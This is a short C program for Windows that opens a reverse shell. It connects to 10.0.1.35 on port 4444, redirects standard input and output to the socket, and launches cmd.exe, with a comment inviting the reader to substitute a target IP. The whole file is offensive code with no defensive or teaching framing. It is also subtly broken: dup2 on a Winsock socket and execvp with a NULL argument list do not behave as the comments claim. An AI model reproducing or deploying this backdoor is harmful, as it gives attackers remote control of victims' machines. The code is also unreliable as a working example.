#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char *ip = "10.0.1.35"; // Replace with the IP you want to connect to
    int port = 4444;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        return 1;
    }

    // Redirect stdin, stdout, and stderr to socket
    dup2(sock, 0);  // stdin
    dup2(sock, 1);  // stdout
    dup2(sock, 2);  // stderr

    // Execute command shell
    execvp("cmd.exe", NULL);

    // Cleanup
    closesocket(sock);
    WSACleanup();

    return 0;
}
